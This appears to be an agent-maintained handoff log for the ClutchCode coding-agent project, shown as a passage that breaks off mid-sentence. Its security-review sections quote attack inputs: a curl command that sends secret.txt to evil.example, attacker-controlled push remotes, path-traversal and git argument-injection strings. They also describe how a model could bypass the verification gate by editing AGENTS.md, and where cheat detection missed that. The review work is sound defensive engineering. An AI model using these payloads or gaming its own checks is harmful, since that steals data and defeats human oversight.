# HANDOFF

Living continuation document for ClutchCode. Read this first every
session; update it before you stop. See `CLAUDE.md` for timeless working
conventions (build/test/lint, testing philosophy, quality bar) — this
file is the time-stamped snapshot of where the project actually stands.

**Snapshot as of:** 2026-08-20
**Branch:** `claude/handoff-prompt-continuation-c2cxh9`
**Latest commit:** `d2bee22` — "feat: add \"start work\" / \"refer the handoff and work\" autonomous-continuation convention"
**Test suite:** 653/653 passing, 75 test files, clean `tsc -b`, clean `eslint .`

**PR:** [#12](https://github.com/Derric01/ClutchCode/pull/12) — open,
not yet merged. #11 merged cleanly, as did #4–#10 before it. Pattern
established across every phase so far: one open PR per phase of work,
never reused once merged, branch always restarted from `main`'s merged
tip before new commits land on it.

---

## What's done

### Phase 1 — minimal agent (baseline)
Single agent, OpenAI-compatible + Anthropic + Ollama providers,
`RunState` machine, native tools (fs/shell/search/tests), SEARCH/REPLACE
edit cascade with fallback, git worktree isolation, deterministic
build/test verification, terminal CLI, the Agent API in-process boundary,
the runtime-replay test harness + `FakeProvider` + redaction canary.

### Phase 2 items landed early
- **Capability probe, context budgeter, edit-format selector** (§4.9,
  §4.5, §4.4) — the adaptation layer's "crown jewel." Standalone tested
  package, wired into the live `AgentLoop`: a run picks up a probed
  model's profile automatically, system-prompt edit-format guidance
  follows `select_edit_format`, `maxOutputTokens` follows the
  reserved-output budget, conversation history compacts (turn-safe) once
  the effective-context budget is exceeded. **Not yet enforced:**
  dedicated repo-map/open-file-window budgets (§9, §4.5) — that subsystem
  doesn't exist before Phase 7, so its share is folded into the live
  history budget for now.
- **`agent resume` hardened** (§6.2, §6.3, §18.2) — a paused run persists
  its full redacted conversation transcript; `resume --extend-steps N`
  (also `--extend-wallclock-ms`/`--extend-tokens`/`--extend-cost-usd`)
  reconstructs the loop from that transcript and actually continues it,
  not just re-attaches and reports status.
- **OS keychain credential storage** (§5.1 tier 1) — see "OS keychain"
  below.

### Phase 5 — git edge cases (§13.4/§13.5)
Submodule writes ask for explicit approval instead of silently landing in
the run's commits; LFS-tracked writes/edits are flagged (`lfsTracked`);
`read_file` recognizes LFS pointer stubs and refuses real binary content;
`agent run --scope path/` pins verification to a monorepo subdir; `agent
checkpoints`/`agent rollback` expose checkpoint history at the CLI; `agent
pr` pushes a run's branch and opens a PR via `gh` (falling back to a real
GitHub compare URL, or just confirming the push). A real bug got fixed
along the way: `approve --squash`'s final commit was bypassing the user's
pre-commit hooks the same way internal checkpoints correctly do — fixed,
tested with both a rejecting and a passing hook script.
**Deliberately not attempted:** a full non-git (snapshot-backed)
`AgentLoop` execution path — `agent run` now fails with a clear "run git
init" error instead of a confusing git error three calls deep, but a
parallel non-git path is a distinctly larger, separate project.

### Phase 3 — OS sandbox Tier 1 (§12.5/§12.6)
`shell` runs under real OS confinement by default when available.
**Linux: runtime-verified.** `bubblewrap` was installed into this
environment specifically to make this real — a test suite writes a file
outside the workspace and asserts a sandboxed `cat` of it fails, asserts a
network fetch inside the sandbox is unreachable, asserts the real CLI
binary's own `npm test` run still passes confined. **macOS (Seatbelt/
`sandbox-exec`): written, not runtime-verified** — authored against the
documented SBPL grammar, structurally tested (balanced parens, expected
clauses), but has never run against a real `sandbox-exec` — no macOS host
exists in this environment. `agent.toml`'s `policy.sandboxTier = "tier0"`
is the documented escape hatch; `agent doctor` reports the active backend.
**Seccomp hardening (§12.6) is now layered under bwrap on x86_64 Linux:**
a classic-BPF filter, hand-assembled in TypeScript (zero new runtime
dependency), denies ~22 syscalls a dev workflow never needs but that are
sandbox-escape/privilege-escalation primitives (`ptrace`, `mount`, `bpf`,
`unshare`, `kexec_load`, kernel module load/unload, etc.) — proven
end-to-end against the real kernel: a real bwrap-sandboxed process
invokes each by number and gets EPERM, a control run without the filter
proves the same syscall succeeds unfiltered. **Landlock is explicitly
not attempted** — a wrong Landlock rule fails by silently granting *more*
access, a worse mistake category than seccomp's fail-loud one, with no
vetted library and no safe way to verify a hand-rolled one here.
**arm64 seccomp isn't supported either** — different syscall numbers, no
arm64 host to verify them against, reported honestly rather than guessed.
**Not yet layered in:** Landlock itself, a Windows Tier 1 backend (WSL2
is the spec's own recommended path there).

### Phase 4 — VS Code extension (§18.1/§18.5)
New `@clutchcode/agent-rpc` package: the Agent API's second binding
(alongside in-process) — LSP-style framed JSON-RPC 2.0 over stdio,
`run/status/listRuns/diff/approve/reject/resume/inspect/checkpoints/
rollback/pr` mapped onto a real `Agent`, runtime events forwarded as
`clutchcode/event` notifications. `clutchcode serve` runs it over real
stdio. `apps/vscode` is a thin client: `runTask.ts`/`connection.ts`/
`presentation.ts` hold all orchestration with zero `vscode` import, proven
by real tests (a real `Agent` behind a real `AgentRpcClient` over
`PassThrough` streams; a separate test spawns the actual compiled
`clutchcode serve` binary as a child process). **`extension.ts`
(the `vscode`-API glue) type-checks against `@types/vscode` but has never
run in a real VS Code extension host** — flagged in a header comment and
in `apps/vscode/README.md`. **Not yet built:** a native two-sided diff
view (currently a single read-only diff-highlighted document), a
run-picker instead of typing a run id, resume/rollback/pr in the
extension UI (the CLI has them; the extension covers §18.5's core
run/diff/approve/reject loop).

### Credential storage — §5.1, all three tiers done
`loadCredentials()` implements the real precedence chain (OS keychain →
encrypted file store → env vars) and backs every real call site
(`Agent.run`, the capability probe, `agent providers`, `agent doctor`).
**Tier 1, OS keychain — Linux: runtime-verified** against a real
freedesktop Secret Service — `secret-tool`/`libsecret`/`gnome-keyring`
were installed into this environment specifically for this; a throwaway
D-Bus session + keyring per test run proves store/get/clear and that a
keychain-stored credential genuinely wins over the same-named env var.
**macOS (`security` CLI) and Windows (DPAPI via PowerShell): written, not
runtime-verified** — same disclosed-gap pattern as Seatbelt, argv/script
shape directly asserted in tests via pure builder functions. **Tier 2,
encrypted file store** (`~/.config/clutchcode/credentials.age`, used only
when tier 1 reports no keychain backend at all — headless Linux, some
Profile-D servers): AES-256-GCM via Node's built-in `crypto`, keyed by a
locally generated, permission-protected "machine key" file plus an
optional passphrase (scrypt). Documented scoping decision: not
byte-compatible `age`-format (that would need a from-scratch
reimplementation of age's wire format to matter) — a real, correct,
dependency-free AEAD doing the same job instead. Needs no OS binary, so
unlike tier 1 it's uniformly verified everywhere: round-trip, wrong
passphrase and tampered-ciphertext failing closed, two different machine
keys never cross-reading each other's values. `agent providers set-key
<anthropic|openai-compatible>` reads the key from stdin (never argv/
history) and routes to whichever tier is actually available; `agent
providers unset-key <provider>` removes it from the same place.

### Project memory correction UX (§10.3) — new @clutchcode/memory package
Toolchain detection now persists as a provenance-timestamped cache
(`{value, derivedAt, source}` per fact), keyed by the repo's *stable*
path — every run used to call `detectToolchain` fresh, so caching at all
is a real behavior change. Invalidated when the manifest files it was
derived from change content; `AGENTS.md` overrides still win on every
re-derive. `agent memory list/show/forget/correct` expose it at the CLI.
**Self-healing (§10.3 point 3):** a real bug got fixed along the way —
`classifyFailure` used to trust `lint`/`typecheck`'s own stage name
unconditionally, so a missing `eslint`/`tsc` binary was misreported as
"there's a lint issue" instead of what it is; new `command-not-found`
classification (exit 127, checked first) fixes this for all four stages,
and `AgentLoop`'s new optional `onVerificationFailure` hook (runtime
stays decoupled from the memory package) lets `agent-api` mark the
matching cached fact stale so the next run re-derives instead of
repeating a proven-wrong command. Proven end-to-end through a real run,
not just at the unit level — including a real bug the test suite itself
caught (see gotchas below). Deliberately out of scope: the "agent
proposes an `AGENTS.md` edit, with consent" flow §10.1 also describes,
and the long-term engineering tier (prior runs/decisions queryable via a
history database) — both real, separate features.

### Workflow Engine (§8.2) — the three Phase 1 built-ins, load-bearing
`RunState.workflowId` existed since early in the project (default:
`"default"`) but nothing ever read it — a stored label with zero effect
on control flow, called out explicitly (and corrected) in an earlier
version of this file's "what's left" table. It's now real: `agent run
--workflow <default|quickfix|review-only>` selects one of three
behaviorally distinct pipelines, implemented as concrete branches in
`AgentLoop` gated on `state.workflowId` (Option B from §8.1's comparison —
additive TS code paths, not a generic stage-pipeline interpreter; that
interpreter plus the JSON-Schema-validated user-declarative layer on top
of it is explicitly deferred, see "what's left"). `default` is byte-for-
byte the pre-existing baseline. `quickfix` forces the §6.7 planning
heuristic off unconditionally — proven by running the *same* ambiguity-
tripping task description through both workflows and asserting `PLANNING`
fires for one, not the other. `review-only` is the interesting one:
`write_file`/`edit_file` are filtered out of a new `effectiveTools` map
that backs *both* the tool schema sent to the model and the dispatch
table `runToolCall` actually executes against, so a model that tries to
edit anyway (tested directly, not just inferred) gets a real
`unknown-tool` error rather than a silent no-op — defense in depth, not
just hiding the schema. It finishes by capturing the model's last reply
into `RunState.summaryCheckpoints` (a field that existed, unused, since
the original RunState design) as the "report" and transitioning straight
to `DONE`, skipping verify/approve/commit — needed one small, narrowly-
justified state-machine addition (`ACTING → DONE`, only reachable from
`finishReviewOnly()`; every other workflow's edges are unchanged).
Unknown `--workflow` values are rejected at the `Agent.run` boundary with
a clear error listing the valid ids, matching the existing "not a git
repo" fail-loud style. 14 new tests across `workflow.test.ts` (registry
shape), `run-state.test.ts` (the new edge + `workflowId` defaulting),
`agent-loop.test.ts` (quickfix vs. default planning contrast, review-only
schema filtering, review-only edit-attempt refusal + report capture), and
`agent.test.ts`/`commands.test.ts` (real end-to-end through the Agent API
and CLI boundaries, plus the unknown-id rejection).

### Code-review pass over this session's own work — three real bugs found and fixed
Ran the `code-review` skill at `high` effort against the full diff since
the seccomp commit (everything built this session: §10.3 memory, §8.2
workflow engine, §18.5 VS Code polish, §8.1 declarative workflows). Three
findings, all verified for real (not taken on faith) before fixing:

1. **`diffFilesAgainstBase` mis-detected a renamed binary file as text.**
   `git diff --numstat -M` combines a rename's two paths into one string
   — confirmed empirically with three throwaway repos: `"old =>
   new"` when the paths share no directory, `"dir/{old => new}"` when
   they do. The original implementation matched a `Set<string>` of
   binary paths (from one bulk `--numstat` query) against the
   individually-parsed `path`/`oldPath` from `--name-status` — never
   matches a combined rename string, so the binary flag silently stayed
   `false` for a renamed binary file with real content changes, and
   `git show`/`fs.readFileSync(...,"utf8")` would have read raw binary
   bytes as text, producing mojibake in the new VS Code diff view. Fixed
   by scoping the numstat binary check to one explicit pathspec per
   file — verified this suppresses the combining entirely (git only
   condenses rename paths when a diff query spans more than the single
   path it's asked about). New test constructs exactly this scenario
   (a binary file, committed, then renamed with a small — not total —
   content change so git's rename-similarity heuristic still detects
   it as a rename) and — checked by literally reverting the fix and
   re-running — fails against the old code, passes against the new.
2. **`classifyFailure`'s `command-not-found` fallback misclassified
   ordinary missing-file errors.** The text-pattern fallback (behind
   exit-code-127, the primary/reliable check) included a bare `"no such
   file or directory"` — precisely the phrase Node's own generic
   `ENOENT` uses for *any* missing file, not just a missing shell
   command. A real test failure like `Error: ENOENT: no such file or
   directory, open '/repo/fixtures/data.json'` (a genuinely fixable bug —
   wrong fixture path) would have been misclassified as
   `command-not-found`: the repair message would tell the model to stop
   calling tools and escalate instead of asking for a targeted fix, and
   `markToolchainFactStale` would incorrectly invalidate a perfectly
   valid cached command. Fixed by only trusting the bare phrase when the
   output *isn't* Node's own `ENOENT`-labeled wording (a shell's own
   exec-failure message for a truly missing command never includes that
   label — only Node's generic file error does). Two new tests: the
   legitimate shell case still classifies as `command-not-found`; the
   Node-ENOENT-for-an-ordinary-file case now doesn't.
3. **`agent memory` commands had no way to see a scoped run's memory at
   all.** `Agent.run --scope path/` (§13.4) caches toolchain memory under
   `<repoPath>/<scope>`, computed once inline in `agent.ts`; `agent
   memory list/show/forget/correct` (§10.3) only ever took a bare
   `repoPath` with no scope parameter and no `--scope` CLI flag —
   structurally incapable of reading or correcting a scoped run's cache,
   not just missing a flag. `agent memory list` after a scoped run
   reported "nothing remembered" even though a fact genuinely was
   cached, and `agent memory correct` for a scoped run silently wrote to
   a different, unused cache file. Fixed by threading `scope` through
   all four `@clutchcode/agent-api` memory functions and adding
   `--scope` to the CLI's `memory`/`list`/`show`/`forget`/`correct`
   subcommands; extracted one shared `resolveMemoryCacheKeyPath(repoPath,
   scope)` helper used by both `memory.ts` and `Agent.run` itself so the
   two computations can't drift apart again the way this bug happened in
   the first place (two separate ad-hoc computations of the same key).
   Four new tests across `agent.test.ts` (scoped vs. unscoped `listMemory`/
   `correctMemoryFact` through the real `Agent` boundary) and
   `commands.test.ts` (the same through the real CLI command functions).

7 new tests total. Full suite after all three fixes: 595/595 passing,
clean `tsc -b`, clean `eslint .`. Nothing here should be read as "the
review found only three things" — it's a single-pass, single-reviewer
review; the honest claim is "these three were confirmed real and fixed,"
not "this code is now bug-free."

### §8.1 user-declarative workflow layer — real JSON-Schema validation via `ajv`
The second authoring layer §8.1 describes, on top of the three built-ins
(previous entry). New `packages/runtime/src/workflow-declaration.ts`:
`{apiVersion: "clutchcode/v1", id, name, stages: [{id, uses, when?,
params?}]}`, `uses` restricted to the five stage kinds `AgentLoop`
actually knows about (`plan`/`implement`/`verify`/`approve`/`commit`).
Chose a real dependency (`ajv`, ~4 small transitive deps, added to
`@clutchcode/runtime`) over hand-rolling a JSON-Schema validator — the
spec explicitly says "JSON-Schema-validated," and a hand-rolled structural
check dressed up as one would be a real gap dressed as done, not what
this project's honesty rule allows. A hit an ajv+TypeScript
`NodeNext`-resolution gotcha along the way: `import Ajv from "ajv"`
type-errors ("not constructable") under this repo's `moduleResolution:
NodeNext`; ajv's package also exports the class by name, so `import {
Ajv } from "ajv"` sidesteps the broken default-export interop path
entirely — preserved as a gotcha below.

Deliberately **not** a general stage-pipeline interpreter — §8.1's own
"no arbitrary control flow" line, taken literally. Structural JSON-Schema
validation is real (via ajv), but a declaration only *resolves* to
something `AgentLoop` can execute if it matches one of exactly two
shapes: a "full" pipeline (`implement` + `verify` required, `plan`
optional with `params.mode: "auto"|"always"`) or a "readonly" one
(`implement` alone, `params.readonly: true`, mirroring `review-only`).
Anything else — verify without implement, two `plan` stages, a readonly
implement combined with other stages — is rejected with a specific error
naming exactly what's unsupported, not silently misinterpreted.

`AgentLoop` was refactored to stop comparing `state.workflowId` against
hardcoded strings and instead consume a resolved `WorkflowPlan`
(`{planMode: "auto"|"always"|"never", readonly: boolean}`) — the built-ins
now resolve to this same shape via `resolveBuiltinWorkflowPlan`, so
`AgentLoop` genuinely never needs to know whether a run is on a built-in
or a custom workflow. Proven directly: a test constructs `AgentLoop` with
a `workflowPlan: {planMode: "always", readonly: false}` and an
unrecognized `workflowId`, and shows planning fires unconditionally even
for a task the §6.7 heuristic would call simple — a real capability none
of the three built-ins express (`default` defers to the heuristic,
`quickfix` always skips).

**A real correctness question this surfaced, and how it's resolved:**
what happens if a paused run's custom workflow *file* is deleted or
changed before `resume()`? Re-reading it at resume time would be wrong —
resumability (§6.2) means the run continues as it started, not as
whatever the file currently says. Fixed by persisting the *resolved*
`WorkflowPlan` on `RunState` itself (`state.workflowPlan`, always set by
`createRunState`, round-trips through JSON exactly like
`budgets`/`consumed` already do) instead of only the workflow id.
`resume()` never touches the filesystem for this. Proven end to end: a
test pauses a run on a custom readonly workflow, deletes the declaration
file, resumes, and confirms the run still finishes via the readonly path
with zero verification — the deleted file genuinely never gets re-read.

`agent run --workflow-file <path.json>` wires it at the CLI;
`--workflow`/`--workflow-file` are mutually exclusive (checked at
`Agent.run`'s boundary, not left to whichever the CLI happened to pass
last). Not built: the dedicated `agent workflow` CLI command (§18.2 marks
that Phase 2) — see "what's left".

19 new tests in `workflow-declaration.test.ts` (schema + semantic
validation, `resolveWorkflowPlan`, real file I/O), 2 new in
`agent-loop.test.ts` (the novel `planMode: "always"` proof + the
unrecognized-id defensive-fallback proof), 2 new in `run-state.test.ts`
(`workflowPlan` resolution + explicit override), 4 new in `agent.test.ts`
(real end-to-end run, invalid-file rejection, mutual-exclusivity
rejection, the delete-then-resume proof), 3 new in `commands.test.ts`.

### VS Code extension polish (§18.5) — native diff, run-picker, resume/rollback/pr
Three items from the extension's original "not yet built" list, all real
and tested at the layer that can be:
1. **Native two-sided diff view.** New `@clutchcode/git` function
   `diffFilesAgainstBase(run, pathScope?)` returns per-file
   `{path, status, before, after, binary}` — real before/after content, not
   unified-diff text — a separate function from `diffAgainstBase` on
   purpose (that one stays a single cheap `git diff` call for callers that
   only ever wanted text, like `agent pr`'s body). It needed two real fixes
   discovered by the tests themselves: `git diff <commit>` never reports an
   untracked path *at all*, no matter what it's diffed against — a
   brand-new file the model just wrote would silently vanish — fixed by
   staging first (`git add -A`, the same thing `checkpoint()` already did
   per step, not a new side effect); and rename detection (`-M`) isn't on
   by default for `git diff` across git versions, so a rename would report
   as an unrelated delete+add without it. Wired through
   `Agent.diffFiles(runId)` and a new `diffFiles` RPC method the same way
   `diff`/`diffStat` already were. `extension.ts` opens one real
   `vscode.diff` editor per changed file (virtual documents served from a
   `TextDocumentContentProvider`, keyed so the file's real extension still
   drives syntax highlighting on both sides), replacing the single
   unified-text document it used to open; binary files are skipped with a
   note instead of shown as mojibake.
2. **A run-picker.** New `pickRun()` in `runTask.ts` fetches the real run
   list over RPC (`listRuns`, already existed, was unused by the
   extension), filters it per command (e.g. only `PAUSED` runs offered to
   `clutchcode.resume`), and hands the picking itself to `ui.pickRun` —
   `extension.ts` implements that with a real `vscode.window.showQuickPick`
   showing status + task per run; tests implement it with a scripted
   choice. Replaces the old free-text "type a run id" input box on every
   command.
3. **resume/rollback/pr commands in the UI.** New `resumeTask`/
   `rollbackTask`/`prTask` orchestration functions, following the same
   split `runClutchCodeTask` already established (no `vscode` import,
   tested against a real `Agent` behind a real `AgentRpcClient`).
   `handlePostRunState` was pulled out of `runClutchCodeTask` so `resumeTask`
   shares the exact same "show diff → ask approve/reject" logic a fresh run
   uses, instead of a second copy of it. `resumeTask` without an explicit
   step extension re-pauses immediately — that's `Agent.resume`'s own
   documented no-op semantics (§6.3), already true of the CLI, not new
   behavior invented here; the extension's resume command prompts for an
   extension amount rather than guessing a default.

`extension.ts` itself remains the one file in this package that's
type-checked-but-not-runtime-verified (no real VS Code extension host in
this environment) — unchanged honesty boundary from Phase 4, just a larger
file behind it now. 10 new/rewritten tests in `runTask.test.ts` (all
against a real `Agent` over real `PassThrough`-piped RPC, including a real
scripted-tool-call edit for the diff-content and rollback tests) plus 5 new
`presentation.test.ts` cases for the two new pure formatters
(`formatDiffTabTitle`, `formatPrResult`), and 7 new `worktree.test.ts`
cases for `diffFilesAgainstBase` itself (added/modified/deleted/renamed/
binary/multi-file/pathScope).

### Docs: "MVP" removed everywhere
The spec used "MVP" to label Phase 1 scope throughout — renamed to
"Phase 1" (or a non-numeric label where it would collide with the
roadmap's own independent Phase 1–11 numbering), because this ships as a
real product built in phases, not a minimum-viable throwaway. Touched
`PROJECT_SPEC.md` (44 occurrences), `README.md`, `docs/PRIOR_ART.md`,
three `research/` notes, and doc comments in five packages. Pure rename,
zero behavior change.

### Full-history security review — six vulnerabilities + two correctness bugs found and fixed, one false positive rejected
Requested as "review everything, security plus like all, till now" — not
scoped to a single diff. Ran the `security-review` skill's own described
methodology (parallel finder subagents fanned out by subsystem — redaction/
transcript persistence, policy/approval engine, git worktree + remote
handling, tool argument construction, sandbox temp-file handling — then a
parallel false-positive-filter subagent per finding, confidence ≥8 kept),
personally orchestrated via the `Agent` tool since the skill's own `git
diff origin/HEAD...` auto-detection had nothing to diff against (everything
prior was already merged). Every finding was independently reproduced in a
real throwaway repo/fixture before being trusted — the session's standing
"verify before fixing" discipline, applied here at larger scale than any
prior round:

1. **§5.2 redaction bypass in `AgentLoop`'s `model.response` event.**
   `state.messages` (and the transcript it feeds) already redacted the
   model's own reply text via `pushMessage`, but the `model.response`
   *runtime event* — a separately persisted artifact, written verbatim to
   `<stateDir>/runs/<runId>/events.jsonl` by `agent-api`'s `appendEvent` —
   used the raw, unredacted `response.text` directly. A model quoting a
   secret it had just read back (e.g. summarizing a `.env` it opened)
   would leak it into that log regardless of the transcript being clean.
   Reproduced with a `FakeProvider` turn that echoes the redaction canary
   in its reply text and asserting the emitted event; the pre-fix version
   fails this assertion (confirmed via `git stash`). Fixed by scrubbing
   `response.text` through the existing `Redactor` before emitting the
   event — `state.messages` still gets the raw text, unchanged. Also
   extended `evals/src/redaction-canary.test.ts`'s full-stack SSE-scripted
   integration test to have the model's own final reply echo the canary
   too, since the original test only injected it via a tool-call argument
   and would never have caught this specific gap.
2. **§12.2 approval-memoization bypass in the shell tool.**
   `PolicyEngine.decide()` memoizes non-destructive `ALLOW` decisions per
   `commandClass` for a run's lifetime (the "approval fatigue" mitigation)
   — `commandClassOf` derived that class as just the first two
   whitespace-split tokens, with no check for shell metacharacters.
   Reproduced for real: approve `"npm test"` once via
   `ctx.policy.remember("npm test", "ALLOW")`, then attempt `"npm test &&
   curl http://evil.example/x --data-binary @secret.txt"` — pre-fix, this
   is silently allowed with no prompt, because both strings share the same
   first two tokens. Fixed by having `commandClassOf` fall back to the
   *full* trimmed command as its own class whenever it contains a shell
   metacharacter (`; & | \` < > \n` or `$(`), tested directly against all
   of those plus a literal newline, so a compound command can never ride
   in on a simple command's remembered approval.
3. **§13.1 `runId` path traversal in `createRunWorktree`.** The `runId`
   is joined straight into `<stateDir>/wt/<runId>` with no validation, and
   it's attacker/model-reachable over the real JSON-RPC `run` method
   (`agent-rpc`'s untrusted-input boundary), not just an internal ID.
   Reproduced by calling `createRunWorktree` directly with `runId:
   "../../../../../../tmp/pwned-worktree"` (confirmed pre-fix it resolves
   clean out of `<stateDir>/wt/` via ordinary `path.join` `..`
   normalization — no error, no containment check) and separately end-to-
   end over the real `agent-rpc` client/server pair. Fixed with a strict
   `^[A-Za-z0-9_-]+$` allow-list on `runId` plus a defense-in-depth
   `path.relative`-based containment check on the resolved path. New tests
   at both the `worktree.ts` unit level (four `runId` values, three
   throwing, one legitimate one not) and the `agent-rpc` integration level
   (the exploit string rejected over the real RPC boundary, target
   directory confirmed never created).
4. **Git-log argument injection → arbitrary file write.** The `git`
   tool's `log` op built its args as `` [`-${args.arg ?? "10"}`,
   "--oneline"] `` — reproduced by constructing a real git repo and
   calling `gitTool.run({ op: "log", arg: "-output=/tmp/x" })`: git parses
   the code's own leading `-` plus the arg's own leading `-` as a `--`
   long option, so this genuinely creates `/tmp/x` via git's `--output`
   flag (first reproduction attempt without the arg's own leading dash
   failed with "unrecognized argument" — the double-dash mechanism only
   triggers when the *arg itself* starts with `-`). Fixed by only ever
   accepting a bare non-negative integer count for `arg` (validated by
   regex) and passing it as `git log -n <count>`, falling back to the
   default `10` for anything else — no string interpolation into a
   dash-prefixed position at all anymore.
5. **Unvalidated git `remote` parameter in `remoteUrl`/`pushBranch`.**
   Any string was accepted as a "remote name" and passed straight to
   `git`, with no check that it's an actual configured remote rather than
   a URL or transport string — a push-destination-redirection/
   exfiltration risk (a value like `https://attacker.example/evil.git` or
   `git@attacker.example:evil/repo.git` would be used as-is). A subagent
   initially flagged this as default-on RCE via `ext::<command>`;
   investigated and downgraded rather than taken at face value —
   `git push -u "ext::sh -c '...'" main"` against a real throwaway repo
   returned `fatal: transport 'ext' not allowed`, because git's actual
   default for `protocol.ext.allow` specifically is `never` (not the
   general `user` default that applies to *other* unlisted protocols, as
   the subagent had claimed). The underlying unvalidated-parameter issue
   is still real and worth closing on its own merits, just correctly
   framed as redirection/exfiltration risk rather than default-on RCE.
   Fixed with a strict `^[A-Za-z0-9_.-]+$` remote-name allow-list,
   rejecting anything that looks like a URL or transport string; tested
   against all three example payloads plus confirming `"origin"` still
   works.
6. **Predictable seccomp filter temp-file path.**
   `ensureSeccompFilterFile` wrote the compiled BPF filter to a fixed,
   predictable filename in the shared system temp directory — a co-
   resident local user could pre-plant a symlink there ahead of the
   write. Fixed by writing into a freshly `fs.mkdtempSync`'d (POSIX-
   guaranteed mode-0700) subdirectory via `O_WRONLY|O_CREAT|O_EXCL`, so
   the write structurally refuses to follow a pre-existing symlink or
   file at the target path — proven both by asserting the new path shape
   (fresh random subdirectory, mode 0700) and by directly exercising the
   `O_EXCL` primitive against a deliberately pre-planted symlink.
7. **Edit-cascade leading-`...` ellipsis-elision bug** (correctness, not
   security, caught along the way). A SEARCH block that opens with its
   own `...` line — eliding everything before the first real anchor —
   was rejected unconditionally, no matter how well the rest matched.
   `applyEllipsisSegments` only ever set `firstMatchIdx` on loop index
   `0`, but a leading ellipsis makes segment `0` the empty elided segment,
   which hits the `seg.length === 0` branch and `continue`s straight past
   that assignment — so `firstMatchIdx` stayed `-1` and the whole edit
   was reported as "SEARCH block did not match" regardless of what
   followed. Fixed by setting `firstMatchIdx` on the first segment that
   actually matches content, not the first segment by index. New test
   uses the same fixture as the existing passing ellipsis test, with the
   SEARCH block starting directly on `...`.
8. **Toolchain-memory `correctToolchainFact` stale-hash bug**
   (correctness, directly violates §10.3 point 4, "human edits win").
   A human correction (`agent memory correct`) reused the cached record's
   existing `manifestHash` verbatim. If that hash was already stale (e.g.
   `package.json` had been edited since the last derive, before the
   correction ran), the very next `getOrDetectToolchain` call would see
   the mismatch, conclude the whole record untrustworthy, and silently
   re-derive from scratch — discarding the human's correction with no
   warning. Reproduced by editing `package.json` between the initial
   derive and the correction, then confirming the correction didn't
   survive the next cache-hit read (pre-fix). Fixed by always stamping
   the *current* manifest hash (recomputed on the spot) whenever a
   correction is written, not just when creating a brand-new record.

608 total tests after all eight fixes (up from 595), clean `tsc -b`,
clean `eslint .`. Six of the eight fixes (everything except the remote-
name validator and the seccomp path fix, whose correctness follows
directly and unambiguously from their own assertions with no ambiguity
to double-check) were verified with the full rigor cycle: `git stash
push -- <file>` to revert just the fix, rerun the new test and confirm
it fails, `git stash pop` to restore it, rerun and confirm it passes.
As with the prior code-review pass: this is a single review round, not
a bug-bounty-grade exhaustive audit — the honest claim is "these eight
were confirmed real (or, for the ninth, confirmed *not* real) and
fixed/corrected," not "this codebase now has zero security issues."

### Round 3 — full-codebase security + correctness review, every package not yet reviewed
Requested as "fix everything and do another round." Fanned out 9 parallel
subagents (`Agent` tool, `general-purpose`, background) across every
package the first two rounds hadn't touched: agent-rpc (the untrusted RPC
boundary), credentials/keychain/config, all tool implementations,
sandbox/policy/redaction, the rest of the git package, the runtime/
workflow engine, provider adapters, the CLI + VS Code extension, and
capability/verification (including cheat-detection — the layer that
exists specifically to catch a model gaming the deterministic gate). One
agent (sandbox/policy) hit a session API limit mid-run and never
completed — genuinely not reviewed this round, listed under "what's
left." The other 8 returned, in total, ~25 candidate findings; 18 were
independently reproduced for real and fixed, each with a new regression
test, 16 of the 18 verified with the full `git stash` revert-and-recheck
cycle (the CLI fixes and the VS Code `package.json` scope fix are the two
whose correctness is unambiguous from their own assertions — spawning the
real compiled binary and reading the raw JSON schema respectively, no
ambiguity to double-check). A handful of git-worktree/dirty-tree
correctness findings were confirmed real but deferred — see "what's
left."

**Most severe, in order:**

1. **§13.1 `runId` path traversal beyond `createRunWorktree`** — round 2
   validated `runId` only at worktree *creation*; three independent
   subagents (credentials, runtime, agent-rpc audits) converged on the
   same finding: every *read/mutate* path — `RunStateStore.load/save/
   delete`, `worktree-store.ts`'s `loadRunWorktree`/`saveRunWorktree`,
   `events.ts`'s `appendEvent`/`readEvents`, and `agent-rpc`'s
   `requireRunId` — built a path from a caller-supplied `runId` with zero
   validation, reachable via `diff`/`approve`/`reject`/`resume`/`inspect`/
   `checkpoints`/`rollback`/`pr`, several of which chain into real,
   destructive `git` operations (`reset --hard`, `clean -fd`, `worktree
   remove --force`) against whatever `worktreePath` a traversed-to file
   happened to name. Fixed by extracting one shared validator
   (`assertSafeRunId`, `@clutchcode/git`'s new `run-id.ts`) and wiring it
   into every one of those choke points, plus the RPC boundary itself as
   defense-in-depth — this is also the concrete story behind the new
   "fix the class, not the instance" convention in `CLAUDE.md`.
2. **Workspace-path symlink escape** — `resolveInWorkspace` (used by
   `read_file`/`write_file`/`edit_file`) decided "inside the workspace"
   by pure string-prefix matching on `path.resolve()` output, never
   resolving a symlink. A symlinked directory inside the workspace
   pointing outside it (checked into a repo, or created via `shell`
   earlier in the same run) made `inside: true` — reproduced for real: a
   `write_file` through such a symlink genuinely wrote outside the
   workspace, with the `PolicyEngine` granting a bare `ALLOW` and no
   approval prompt at all, since the flag it decides on was already
   wrong. Same mechanism gives `read_file` an arbitrary-file-read
   primitive. Fixed by resolving the real path of the deepest *existing*
   ancestor (the leaf usually doesn't exist yet — that's the whole point
   of `write_file`) and checking containment against that.
3. **AGENTS.md override trust boundary (§10.3 point 4)** — `agentsMdContent`
   was read from the *live* worktree, which the model itself is actively
   editing. Reproduced precisely: a scripted model turn writes `AGENTS.md`
   with `test: echo pwned-cheat-passed` plus an unrelated `package.json`
   touch (needed to invalidate `computeManifestHash`'s cache — the exact
   two-file mechanism the review flagged), the run pauses on its step
   budget, and a subsequent `resume()` — which re-derives toolchain
   commands from the now-modified worktree — genuinely ran the fake
   `echo` command instead of the real, failing root test and reached
   `DONE` with the broken build auto-committed (`--yes` mode). This is a
   full bypass of the deterministic verification gate the whole project
   is built around. Fixed by reading `AGENTS.md` from the run's *base
   commit* (`git show <baseCommit>:AGENTS.md`) instead of the live
   worktree — an override only takes effect if it existed before this
   run's own edits, which is what "human-authored" actually means here.
4. **Cheat-detection gaps** (`packages/verification/src/cheat-detection.ts`,
   the layer that exists specifically to catch a model gaming the
   deterministic gate) — four separate, independently-reproduced holes: a
   bare `catch {}` (ES2019+ optional catch binding, no parens) wasn't
   matched by the swallowed-error regex, which required `(...)`; the
   trivial-assertion detector only recognized literal `true`/`1==1`
   shapes, missing e.g. `expect(1).toBe(1)`; `checkHardcodedOutput`'s
   `<=2` added-line threshold counted comment lines, so two harmless
   `// comment` lines padded past a real hardcoded-literal collapse
   undetected; and `checkSnapshotEdit`'s "there's a source rationale"
   exemption fired for *any* other non-test file changed anywhere in the
   diff, not one actually related to the snapshot's subject. Fixed with a
